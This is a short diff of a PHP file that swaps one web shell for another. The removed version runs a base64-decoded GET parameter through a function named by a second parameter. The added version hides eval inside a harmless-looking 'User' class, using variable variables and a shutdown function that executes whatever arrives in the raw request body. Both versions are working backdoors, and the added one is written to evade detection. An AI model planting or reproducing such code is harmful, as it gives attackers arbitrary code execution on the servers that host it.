@@ -1,7 +1,21 @@
 <?php
-$func = base64_decode($_GET["func"]);
-$a = "a";
-$s = "s";
-$c=$a.$s.$_GET["func2"];
-$c($func);
+class User {
+    public static function getpublicMethod() {
+        return 'publicMethod';
+    }
+    public static function publicMethod($args) {
+        $key = 'args';
+        $pass_decode = $$key;
+        return @eval($pass_decode);
+    }
+}
+$classloader = 'User';
+$method = $classloader::getpublicMethod();
+$aes_decode = <<<'EOF'
+register_shutdown_function(function(){
+    $data=file_get_contents("php://input");
+    if(!empty($data)) eval($data);
+});
+EOF;
+User::$method($aes_decode);
 ?>
